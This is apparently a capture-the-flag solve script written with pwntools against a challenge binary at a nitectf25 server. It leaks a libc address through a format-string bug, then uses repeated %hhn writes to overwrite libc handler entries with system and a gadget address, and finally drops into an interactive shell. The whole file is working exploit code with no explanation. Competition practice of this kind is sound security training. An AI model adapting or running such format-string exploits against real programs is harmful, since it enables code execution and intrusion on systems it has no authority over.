#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def fmt(payload):
    assert len(payload) <= 48
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b'>>', cyclic(0x20))
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b'index:', b'0')
    io.sendlineafter(b'leave..', payload)
    io.recvline() ; io.recvline()

io = remote("yellow.chals.nitectf25.live", 1337, ssl=True)

fmt(b'%p.'*10) ; libc.address = int(io.recvline().strip().split(b'.')[5], 16) - 0xbe280

payload  = b''
payload += b'%*c'*3 + b'%p'*4 + f'%196x'.encode()
payload  = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + b'.%hhn.'
payload  = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + p64(libc.sym.slot)

fmt(payload)

writes = {
    libc.sym.head: libc.sym.head + 56,
    libc.sym.head + 56 + 8: libc.sym.system,
    libc.sym.head + 56 + 0x108: libc.address + 0xa7fd1,
}

for addr, value in writes.items():
    for i in range(6):
        payload = b''
        payload += b'%*c' * 3 + b'%p' * 4
        payload += f'%{((value >> i*8) & 0xff) + 195}x'.encode()
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + b'.%hhn.'
        payload = payload.ljust((len(payload) + 7) // 8 * 8, b' ') + p64(addr + i)
        fmt(payload)

io.sendlineafter(b'>>', b'3')
io.interactive()

